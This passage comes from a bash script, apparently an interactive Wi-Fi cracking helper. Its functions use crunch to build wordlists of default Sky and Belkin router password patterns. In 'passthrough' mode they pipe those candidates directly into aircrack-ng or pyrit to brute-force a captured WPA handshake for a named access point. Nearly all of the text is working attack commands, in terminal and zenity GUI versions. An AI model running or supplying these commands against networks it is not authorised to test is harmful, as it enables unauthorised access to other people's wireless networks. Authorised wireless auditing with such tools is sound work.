		elif [ "$passthrough" = "1" ]; then
		zenity --info --timeout=4 --text "About to passthrough attack."
		/usr/bin/crunch 10 10 -t %%%%%%%%%% | aircrack-ng -w - -e "$passthroughap" "$passthroughcap"
		elif [ "$passthrough" = "2" ]; then
		zenity --info --timeout=4 --text "About to passthrough attack."
		/usr/bin/crunch 10 10 -t %%%%%%%%%% | pyrit -r "$passthroughcap" -e "$passthroughap" -i - attack_passthrough
		fi
	else
		f_menu
	fi
	if [ "$passthrough" = "0" ]; then
	zenity --no-wrap --info --timeout=4 --text "Finished processing $filename.lst"
	if [ "$destination" != "" ]; then
		zenity --no-wrap --info --timeout=4 --text "Moving $filename.lst to $destination"
		mv $filename.lst "$destination"
	fi
	zenity --no-wrap --info --timeout=4 --text "Returning to the main menu"
	else
		echo
	fi
}
###SKY###
function f_sky () {
	f_echobreak
	if [ "$GTK" = "y" ]; then
		f_skyGTK
	else
	echo "This script will create a word list for pre-set SKY (i.e. SKY12345) router passwords."
        echo
	sleep 1
        echo "This worldlist will be around ~1700gb, make sure you have HDD space!";echo "(If passthrough is enabled this script will not generate a word list.)"
        echo
	sleep 1
	echo
	if [ "$passthrough" = "0" ]; then
	echo "What would you like the output file to be named?"
	echo "(The file will be saved with the .lst extension)"
	echo
	sleep 1
	read filename
	echo
	sleep 1
	echo "Where would you like $filename.lst to be placed? (ex. /root/Desktop/)"
	echo 
	read destination
	while [ ! -d "$destination" ]
		do
			echo
			echo "Directory cannot be found or does not exist"
			echo
			sleep 1
			echo "Would you like to create a folder for the directory you selected? (y/n)"
			read newdir
			if [ $newdir = "y" ]; then
				mkdir "$destination"
				while [ ! -d "$destination" ]
				do
					echo "Folder: $destination still cannot be found, starting over..."
					sleep 2
					f_sky
				done
			else	
				sleep 1
				echo "Where would you like the output word list to be placed?"
				echo "(e.x. /root/Desktop/)"
				read destination
			fi
		done
	echo
	sleep 1
	else
		echo
	fi
	echo "Hit enter to create/passthough the word list"
        read return
        if [ "$return" == "" ]; then
        echo "Please wait while the list is being generated/passthrough...";echo
	sleep 1
	if [ "$passthrough" = "0" ]; then
        /usr/bin/crunch 8 8 -t ,,,,,,,, -o $filename.lst
	elif [ "$passthrough" = "1" ]; then
	echo "About to passthrough attack.";echo
	sleep 2
	/usr/bin/crunch 8 8 -t ,,,,,,,, | aircrack-ng -w - -e "$passthroughap" "$passthroughcap"
	elif [ "$passthrough" = "2" ]; then
	echo "About to passthrough attack.";echo
	sleep 2
	/usr/bin/crunch 8 8 -t ,,,,,,,, | pyrit -r "$passthroughcap" -e "$passthroughap" -i - attack_passthrough
	fi
	fi
	echo "Finished processing $filename.lst"
	echo
	sleep 1
	if [ "$destination" != "" ]; then
		echo "Moving $filename.lst to $destination"
		mv $filename.lst "$destination"
		echo
		sleep 1
	fi
	echo "Returning to the main menu"
	sleep 2
	fi
}
###SKYGTK###
function f_skyGTK () {
	if [ "$passthrough" = "0" ]; then
	zenity --no-wrap --info --text "This script will create a word list for pre-set Sky (i.e. Sky 12345) router passwords.\nThis worldlist will be around ~1700gb, make sure you have HDD space!\n(If passthrough is enabled this script will not generate a word list.)"
	filename=$(zenity --entry --title "File Name?" --text "What to name the new word list file?\n(The file will be saved with the .lst extension)")
	destination=$(zenity --file-selection --directory --title "File Destination" --text "Where would you like to place $filename.lst")
	else
		echo
	fi
	zenity --no-wrap --question --title "Make word list" --text "Would you like to create/passthrough the word list: $filename.lst"
	if (( $? == 0 )); then
		sleep 1
		if [ "$passthrough" = "0" ]; then
        	/usr/bin/crunch 8 8 -t ,,,,,,,, -o $filename.lst
		elif [ "$passthrough" = "1" ]; then
		zenity --info --timeout=4 --text "About to passthrough attack."
		/usr/bin/crunch 8 8 -t ,,,,,,,, | aircrack-ng -w - -e "$passthroughap" "$passthroughcap"
		elif [ "$passthrough" = "2" ]; then
		zenity --info --timeout=4 --text "About to passthrough attack."
		/usr/bin/crunch 8 8 -t ,,,,,,,, | pyrit -r "$passthroughcap" -e "$passthroughap" -i - attack_passthrough
		fi
	else
		f_menu
	fi
	if [ "$passthrough" = "0" ]; then
	zenity --no-wrap --info --timeout=4 --text "Finished processing $filename.lst"
	if [ "$destination" != "" ]; then
		zenity --no-wrap --info --timeout=4 --text "Moving $filename.lst to $destination"
		mv $filename.lst "$destination"
	fi
	zenity --no-wrap --info --timeout=4 --text "Returning to the main menu"
	else
		echo
	fi
}
###belkin###
function f_belkin () {
	f_echobreak
	if [ "$GTK" = "y" ]; then
		f_belkinGTK
	else
	echo "This script will create a word list for pre-set Belkin (i.e. belkin54g) router passwords."
        echo
	sleep 1
        echo "This worldlist will be around ~6gb, make sure you have HDD space!";echo "(If passthrough is enabled this script will not generate a word list.)"
        echo
	sleep 1
	echo
	if [ "$passthrough" = "0" ]; then
	echo "What would you like the output file to be named?"
	echo "(The file will be saved with the .lst extension)"
	echo
	sleep 1
	read filename
	echo
	sleep 1
	echo "Where would you like $filename.lst to be placed? (ex. /root/Desktop/)"
	echo 
	read destination
	while [ ! -d "$destination" ]
		do
			echo
			echo "Directory cannot be found or does not exist"
			echo
			sleep 1
			echo "Would you like to create a folder for the directory you selected? (y/n)"
			read newdir
			if [ $newdir = "y" ]; then
				mkdir "$destination"
				while [ ! -d "$destination" ]
				do
					echo "Folder: $destination still cannot be found, starting over..."
					sleep 2
					f_belkin
				done
			else	
				sleep 1
				echo "Where would you like the output word list to be placed?"
				echo "(e.x. /root/Desktop/)"
				read destination
			fi
		done
	echo
	sleep 1
	else
		echo
	fi
	echo "Hit enter to create/passthough the word list"
        read return
        if [ "$return" == "" ]; then
        echo "Please wait while the list is being generated/passthrough...";echo
	sleep 1
	if [ "$passthrough" = "0" ]; then
        /usr/bin/crunch 8 8 abcdefghijklmnopqrstuvwxyz + 1234567890 -t @@%%%%%% -o $filename.lst
	elif [ "$passthrough" = "1" ]; then
	echo "About to passthrough attack.";echo
	sleep 2
	/usr/bin/crunch 8 8 abcdefghijklmnopqrstuvwxyz + 1234567890 -t @@%%%%%% | aircrack-ng -w - -e "$passthroughap" "$passthroughcap"
	elif [ "$passthrough" = "2" ]; then
	echo "About to passthrough attack.";echo
	sleep 2
	/usr/bin/crunch 8 8 abcdefghijklmnopqrstuvwxyz + 1234567890 -t @@%%%%%% | pyrit -r "$passthroughcap" -e "$passthroughap" -i - attack_passthrough
	fi
	fi
	echo "Finished processing $filename.lst"
	echo
	sleep 1
	if [ "$destination" != "" ]; then
		echo "Moving $filename.lst to $destination"
		mv $filename.lst "$destination"
		echo
		sleep 1
	fi
	echo "Returning to the main menu"
	sleep 2
	fi
}
###belkin###
function f_belkinGTK () {
	if [ "$passthrough" = "0" ]; then
	zenity --no-wrap --info --text "This script will create a word list for pre-set Belkin router passwords.\nThis worldlist will be around ~6gb, make sure you have HDD space!\n(If passthrough is enabled this script will not generate a word list.)"
	filename=$(zenity --entry --title "File Name?" --text "What to name the new word list file?\n(The file will be saved with the .lst extension)")
	destination=$(zenity --file-selection --directory --title "File Destination" --text "Where would you like to place $filename.lst")
	else
		echo
	fi
	zenity --no-wrap --question --title "Make word list" --text "Would you like to create/passthrough the word list: $filename.lst"
	if (( $? == 0 )); then
		sleep 1
        		if [ "$passthrough" = "0" ]; then
        		/usr/bin/crunch 8 8 abcdefghijklmnopqrstuvwxyz + 1234567890 -t @@%%%%%% -o $filename.lst
			elif [ "$passthrough" = "1" ]; then
			zenity --info --timeout=4 --text "About to passthrough attack."
			/usr/bin/crunch 8 8 abcdefghijklmnopqrstuvwxyz + 1234567890 -t @@%%%%%% | aircrack-ng -w - -e "$passthroughap" "$passthroughcap"
			elif [ "$passthrough" = "2" ]; then
			zenity --info --timeout=4 --text "About to passthrough attack."
			/usr/bin/crunch 8 8 abcdefghijklmnopqrstuvwxyz + 1234567890 -t @@%%%%%% | pyrit -r "$passthroughcap" -e "$passthroughap" -i - attack_passthrough
			fi
	else
		f_menu
	fi
	if [ "$passthrough" = "0" ]; then
	zenity --no-wrap --info --timeout=4 --text "Finished processing $filename.lst"
	if [ "$destination" != "" ]; then
		zenity --no-wrap --info --timeout=4 --text "Moving $filename.lst to $destination"
		mv $filename.lst "$destination"
	fi
	zenity --no-wrap --info --timeout=4 --text "Returning to the main menu"
	else
		echo
	fi
}
